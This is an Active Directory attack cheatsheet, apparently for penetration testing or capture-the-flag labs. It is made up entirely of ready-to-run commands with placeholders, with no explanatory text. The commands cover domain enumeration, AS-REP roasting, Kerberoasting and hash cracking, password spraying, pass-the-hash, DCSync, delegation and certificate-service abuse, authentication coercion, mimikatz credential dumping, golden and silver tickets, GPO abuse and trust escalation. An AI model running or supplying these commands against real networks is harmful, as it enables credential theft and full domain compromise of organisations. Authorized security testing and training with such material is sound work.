# Active Directory Attack Cheatsheet

## BloodHound Enumeration

### SharpHound (Windows)
    .\SharpHound.exe -c All -d <DOMAIN> --zipfilename loot.zip

### BloodHound.py (Linux)
    bloodhound-python -d <DOMAIN> -u <USER> -p '<PASSWORD>' -ns <TARGET_IP> -c all

### NetExec BloodHound
    nxc ldap <TARGET_IP> -u <USER> -p '<PASSWORD>' -d <DOMAIN> --bloodhound -ns <NAMESERVER> --collection All


## LDAP Enumeration


### Anonymous bind
    ldapsearch -x -H ldap://<TARGET_IP> -b "DC=domain,DC=htb"

### Authenticated
    ldapsearch -x -H ldap://<TARGET_IP> -D "<USER>@<DOMAIN>" -w '<PASSWORD>' -b "DC=domain,DC=htb"

### Find users
    ldapsearch -x -H ldap://<TARGET_IP> -D "<USER>@<DOMAIN>" -w '<PASSWORD>' -b "DC=domain,DC=htb" "(objectClass=user)" sAMAccountName

### Find computers
    ldapsearch -x -H ldap://<TARGET_IP> -D "<USER>@<DOMAIN>" -w '<PASSWORD>' -b "DC=domain,DC=htb" "(objectClass=computer)" name

### NetExec LDAP Users
    nxc ldap <TARGET_IP> -u <USER> -p <PASSWORD> -d <DOMAIN> --users

### NetExec LDAP Groups
    nxc ldap <TARGET_IP> -u <USER> -p <PASSWORD> -d <DOMAIN> --groups


## SMB Enumeration

### NetExec SMB Null Session Shares
    nxc smb <TARGET_IP> -u '' -p '' --shares

### SMBClient Null Session
    smbclient -N -L //<TARGET_IP>

### NetExec SMB Authenticated Shares
    nxc smb <TARGET_IP> -u <USER> -p <PASSWORD> --shares

### SMBClient Authenticated
    smbclient //<TARGET_IP>/<SHARE> -U '<USER>%<PASSWORD>'

### NetExec SMB RID Brute Force
    nxc smb <TARGET_IP> -u '' -p '' --rid-brute

### NetExec SMB Spider Plus
    nxc smb <TARGET_IP> -u <USER> -p <PASSWORD> -M spider_plus


## RPC Enumeration

### RPCClient Null Session
    rpcclient -U "" -N <TARGET_IP>

### RPCClient Enumerate Domain Users
    rpcclient> enumdomusers

### RPCClient Enumerate Domain Groups
    rpcclient> enumdomgroups

### RPCClient Query User
    rpcclient> queryuser 0x1f4

### enum4linux-ng Full Scan
    enum4linux-ng -A <TARGET_IP>


## Credential Attacks

### AS-REP Roasting

### GetNPUsers From User List
    impacket-GetNPUsers <DOMAIN>/ -usersfile <USERS_FILE> -format hashcat -outputfile asrep.hash -dc-ip <TARGET_IP>

### GetNPUsers Authenticated
    impacket-GetNPUsers <DOMAIN>/<USER>:<PASSWORD> -request -format hashcat -outputfile asrep.hash

### Crack AS-REP Hash
    hashcat -m 18200 asrep.hash /usr/share/wordlists/rockyou.txt


### Kerberoasting

### GetUserSPNs
    impacket-GetUserSPNs <DOMAIN>/<USER>:<PASSWORD> -request -outputfile kerberoast.hash

### NetExec Kerberoasting
    nxc ldap <TARGET_IP> -u <USER> -p <PASSWORD> -d <DOMAIN> --kerberoasting kerberoast.hash

### Rubeus Kerberoast (Windows)
    .\Rubeus.exe kerberoast /outfile:kerberoast.hash

### Crack Kerberoast Hash
    hashcat -m 13100 kerberoast.hash /usr/share/wordlists/rockyou.txt


### Password Spraying

### NetExec Password Spray
    nxc smb <TARGET_IP> -u <USERS_FILE> -p '<PASSWORD>' -d <DOMAIN> --continue-on-success

### Kerbrute Password Spray
    kerbrute passwordspray -d <DOMAIN> --dc <TARGET_IP> <USERS_FILE> '<PASSWORD>'


### Pass-the-Hash

### NetExec Pass-the-Hash
    nxc smb <TARGET_IP> -u <USER> -H <NTLM_HASH> -d <DOMAIN>

### Impacket PsExec Pass-the-Hash
    impacket-psexec <DOMAIN>/<USER>@<TARGET_IP> -hashes :<NTLM_HASH>

### Evil-WinRM Pass-the-Hash
    evil-winrm -i <TARGET_IP> -u <USER> -H <NTLM_HASH>

### Impacket WMIExec Pass-the-Hash
    impacket-wmiexec <DOMAIN>/<USER>@<TARGET_IP> -hashes :<NTLM_HASH>


### DCSync

### Impacket DCSync
    impacket-secretsdump <DOMAIN>/<USER>:<PASSWORD>@<TARGET_IP> -just-dc-ntlm

### Impacket DCSync Specific User
    impacket-secretsdump <DOMAIN>/<USER>:<PASSWORD>@<TARGET_IP> -just-dc-user <TARGET_USER>

### Mimikatz DCSync (Windows)
    mimikatz# lsadump::dcsync /domain:<DOMAIN> /user:<TARGET_USER>


## Delegation Attacks

### Unconstrained Delegation

### findDelegation Find Unconstrained
    impacket-findDelegation <DOMAIN>/<USER>:<PASSWORD> -dc-ip <TARGET_IP>

### Rubeus Monitor TGTs (Windows)
    .\Rubeus.exe monitor /interval:5 /nowrap

### PrinterBug Coerce Authentication
    python3 printerbug.py <DOMAIN>/<USER>:<PASSWORD>@<DC_IP> <LISTENER_IP>

### PetitPotam Coerce Authentication
    python3 PetitPotam.py <LISTENER_IP> <DC_IP>


### Constrained Delegation

### GetST Constrained Delegation
    impacket-getST -spn cifs/<TARGET_HOST>.<DOMAIN> -impersonate <TARGET_USER> <DOMAIN>/<USER>:<PASSWORD>

### Export Kerberos Ticket
    export KRB5CCNAME=<TARGET_USER>.ccache

### PsExec With Ticket
    impacket-psexec -k -no-pass <DOMAIN>/<TARGET_USER>@<TARGET_HOST>.<DOMAIN>

### GetST S4U2Self S4U2Proxy
    impacket-getST -spn cifs/<TARGET_HOST>.<DOMAIN> -impersonate <TARGET_USER> -dc-ip <TARGET_IP> <DOMAIN>/<USER>:<PASSWORD>


### Resource-Based Constrained Delegation (RBCD)

### Add Computer Account
    impacket-addcomputer <DOMAIN>/<USER>:<PASSWORD> -computer-name '<FAKE_COMPUTER>$' -computer-pass '<FAKE_PASSWORD>'

### Set RBCD Attribute
    impacket-rbcd -delegate-from '<FAKE_COMPUTER>$' -delegate-to '<TARGET_COMPUTER>$' -action write <DOMAIN>/<USER>:<PASSWORD>

### GetST RBCD Service Ticket
    impacket-getST -spn cifs/<TARGET_HOST>.<DOMAIN> -impersonate <TARGET_USER> <DOMAIN>/'<FAKE_COMPUTER>$':'<FAKE_PASSWORD>'


## ADCS Attacks

### Certipy Find Templates
    certipy find -u <USER>@<DOMAIN> -p '<PASSWORD>' -dc-ip <TARGET_IP>

### Certipy ESC1 Request Certificate
    certipy req -u <USER>@<DOMAIN> -p '<PASSWORD>' -ca <CA_NAME> -template <TEMPLATE> -upn <TARGET_USER>@<DOMAIN>

### Certipy ESC4 Modify Template
    certipy template -u <USER>@<DOMAIN> -p '<PASSWORD>' -template <TEMPLATE> -save-old

### Certipy ESC8 NTLM Relay
    certipy relay -ca <CA_HOST>.<DOMAIN> -template DomainController

### Certipy Authenticate With Certificate
    certipy auth -pfx <TARGET_USER>.pfx -dc-ip <TARGET_IP>


## Lateral Movement

### Evil-WinRM Password Auth
    evil-winrm -i <TARGET_IP> -u <USER> -p '<PASSWORD>'

### Evil-WinRM Hash Auth
    evil-winrm -i <TARGET_IP> -u <USER> -H <NTLM_HASH>

### Impacket PsExec
    impacket-psexec <DOMAIN>/<USER>:<PASSWORD>@<TARGET_IP>

### Impacket SMBExec
    impacket-smbexec <DOMAIN>/<USER>:<PASSWORD>@<TARGET_IP>

### Impacket WMIExec
    impacket-wmiexec <DOMAIN>/<USER>:<PASSWORD>@<TARGET_IP>

### Impacket ATExec
    impacket-atexec <DOMAIN>/<USER>:<PASSWORD>@<TARGET_IP> "whoami"

### Impacket DCOMExec
    impacket-dcomexec <DOMAIN>/<USER>:<PASSWORD>@<TARGET_IP>


## Post-Exploitation

### secretsdump Local SAM
    impacket-secretsdump -sam SAM -system SYSTEM -security SECURITY LOCAL

### secretsdump Remote
    impacket-secretsdump <DOMAIN>/<USER>:<PASSWORD>@<TARGET_IP>

### Mimikatz LSASS Dump (Windows)
    mimikatz# sekurlsa::logonpasswords

### Mimikatz DPAPI Chrome (Windows)
    mimikatz# dpapi::chrome /in:"C:\Users\<USER>\AppData\Local\Google\Chrome\User Data\Default\Login Data"


### Golden Ticket

### secretsdump Get krbtgt Hash
    impacket-secretsdump <DOMAIN>/<USER>:<PASSWORD>@<TARGET_IP> -just-dc-user krbtgt

### ticketer Create Golden Ticket
    impacket-ticketer -nthash <KRBTGT_HASH> -domain-sid <DOMAIN_SID> -domain <DOMAIN> <TARGET_USER>

### Export Golden Ticket
    export KRB5CCNAME=<TARGET_USER>.ccache

### PsExec With Golden Ticket
    impacket-psexec -k -no-pass <DOMAIN>/<TARGET_USER>@<DC_HOST>.<DOMAIN>


### Silver Ticket

### ticketer Create Silver Ticket
    impacket-ticketer -nthash <SERVICE_HASH> -domain-sid <DOMAIN_SID> -domain <DOMAIN> -spn cifs/<TARGET_HOST>.<DOMAIN> <TARGET_USER>


## GPO Abuse

### SharpGPOAbuse Add Local Admin (Windows)
    .\SharpGPOAbuse.exe --AddLocalAdmin --UserAccount <USER> --GPOName "<GPO_NAME>"

### pyGPOAbuse Add Local Admin
    python3 pygpoabuse.py <DOMAIN>/<USER>:<PASSWORD> -gpo-id "<GPO_GUID>" -command 'net localgroup administrators <USER> /add' -f


## Trust Attacks

### Mimikatz Get Trust Key (Windows)
    mimikatz# lsadump::trust /patch

### Mimikatz Inter-Realm TGT (Windows)
    mimikatz# kerberos::golden /user:<TARGET_USER> /domain:<CHILD_DOMAIN> /sid:<CHILD_DOMAIN_SID> /krbtgt:<KRBTGT_HASH> /sids:<PARENT_DOMAIN_SID>-519 /ptt

### Impacket raiseChild
    impacket-raiseChild <DOMAIN>/<USER>:<PASSWORD> -target-exec <DC_IP>
